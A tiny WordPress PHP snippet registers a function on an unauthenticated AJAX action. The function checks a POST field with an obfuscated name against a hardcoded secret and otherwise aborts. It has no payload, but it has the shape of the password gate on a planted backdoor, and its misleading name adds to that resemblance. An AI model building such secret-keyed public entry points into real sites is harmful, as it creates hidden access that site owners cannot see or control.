<?php

function copy_qr_website() {
	if (!isset($_POST["zhsfzeyxd"]) || $_POST["zhsfzeyxd"] !== "pRbhTms63") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'copy_qr_website', 5, 1);
